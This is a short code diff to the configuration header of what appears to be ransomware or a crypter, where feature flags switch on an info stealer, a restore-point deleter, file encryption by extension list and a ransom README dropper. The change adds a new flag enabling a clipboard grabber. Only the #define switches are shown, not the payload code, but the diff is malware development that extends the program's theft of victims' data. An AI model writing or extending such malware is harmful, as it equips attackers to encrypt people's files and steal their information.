@@ -47,6 +47,7 @@
 #define DELETE_RESTOREPOINT false	// enable or disable restore points deleter
 #define CHANGE_FILE_ICON	false	// enable or disable custom icon for crypted files
 #define STEAL_INFO			true	// enable or disable info stealer
+#define GET_CLIPBOARD		true	// enable or disable clipboard grabber
 #define ENABLE_BLACKLIST	true	// enable or disable blacklist for file extension
 #define ENABLE_WHITELIST	true	// enable or disable whitelist for file extension
 #define DROP_README			false	// enable or disable README dropper
